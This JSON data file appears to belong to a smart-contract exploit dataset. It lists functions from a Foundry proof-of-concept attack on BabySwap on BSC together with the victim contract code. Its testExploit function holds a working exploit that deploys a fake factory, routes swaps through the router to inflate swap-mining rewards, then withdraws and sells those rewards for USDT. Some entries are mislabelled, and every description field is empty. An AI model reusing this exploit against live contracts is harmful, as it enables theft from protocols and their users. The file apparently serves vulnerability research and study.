[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 21_811_979);\n        // Adding labels to improve stack traces' readability\n        vm.label(address(WBNB_TOKEN), \"WBNB_TOKEN\");\n        vm.label(address(USDT_TOKEN), \"USDT_TOKEN\");\n        vm.label(address(BABY_TOKEN), \"BABY_TOKEN\");\n        vm.label(address(BABYSWAP_ROUTER), \"BABYSWAP_ROUTER\");\n        vm.label(address(SWAP_MINING), \"SWAP_MINING\");\n        vm.label(BABYSWAP_FACTORY, \"BABYSWAP_FACTORY\");\n        vm.label(0xE730C7B7470447AD4886c763247012DfD233bAfF, \"USDT_BABY_BABYPAIR\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\", USDT_TOKEN.balanceOf(address(this)), 18\n        );\n        (bool success,) = address(WBNB_TOKEN).call{value: 20_000}(\"\");\n        require(success, \"Transfer failed.\");\n        WBNB_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);\n        BABY_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);\n\n        // create fakefactory\n        FakeFactory factory = new FakeFactory();\n\n        // swap token to claim reward\n        address[] memory path1 = new address[](2);\n        path1[0] = address(WBNB_TOKEN);\n        path1[1] = address(USDT_TOKEN);\n        address[] memory factories = new address[](1);\n        factories[0] = address(factory);\n        uint256[] memory fees = new uint256[](1);\n        fees[0] = 0;\n        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path1, factories, fees, address(this), block.timestamp);\n        // swap token to claim reward\n        address[] memory path2 = new address[](2);\n        path2[0] = address(WBNB_TOKEN);\n        path2[1] = address(BABY_TOKEN);\n        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path2, factories, fees, address(this), block.timestamp);\n\n        // claim reward token\n        SWAP_MINING.takerWithdraw();\n        _BABYToUSDT();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance before exploit\", USDT_TOKEN.balanceOf(address(this)), 18\n        );\n    }\n\n    /**\n",
    "description": ""
  },
  {
    "contract/interface": "ISwapMining",
    "source_type": "victim_contract",
    "function_name": "takerWithdraw",
    "original_code": "    function takerWithdraw() public {\n        uint256 userSub;\n        uint256 length = poolInfo.length;\n        for (uint256 pid = 0; pid < length; ++pid) {\n            PoolInfo storage pool = poolInfo[pid];\n            UserInfo storage user = userInfo[pid][msg.sender];\n            if (user.quantity > 0) {\n                mint(pid);\n                // The reward held by the user in this pool\n                uint256 userReward = pool.allocMdxAmount.mul(user.quantity).div(pool.quantity);\n                pool.quantity = pool.quantity.sub(user.quantity);\n                pool.allocMdxAmount = pool.allocMdxAmount.sub(userReward);\n                user.quantity = 0;\n                user.blockNumber = block.number;\n                userSub = userSub.add(userReward);\n            }\n        }\n        if (userSub <= 0) {\n            return;\n        }\n        console.log(userSub);\n        babyToken.transfer(msg.sender, userSub);\n    }\n\n    // Get rewards from users in the current pool\n",
    "description": ""
  },
  {
    "contract/interface": "IBabySwapRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] memory path,\n        address[] memory factories,\n        uint[] memory fees,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) {\n        amounts = BabyLibrarySmartRouter.getAggregationAmountsOut(factories, fees, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'BabyRouter: INSUFFICIENT_OUTPUT_AMOUNT');\n        amounts[0] = routerFee(factories[0], msg.sender, path[0], amounts[0]);\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, BabyLibrarySmartRouter.pairFor(factories[0], path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, factories, to);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeFactory",
    "source_type": "victim_contract",
    "function_name": "getPair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FakeFactory",
    "source_type": "victim_contract",
    "function_name": "getReserves",
    "original_code": "    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {\n        (address token0,) = sortTokens(tokenA, tokenB);\n        pairFor(factory, tokenA, tokenB);\n        (uint reserve0, uint reserve1,) = IBabyPair(pairFor(factory, tokenA, tokenB)).getReserves();\n        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n    }\n\n    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n",
    "description": ""
  },
  {
    "contract/interface": "FakeFactory",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Baby: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Baby: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Baby: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IBabyCallee(to).babyCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Baby: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(2));\n        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(2));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Baby: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  }
]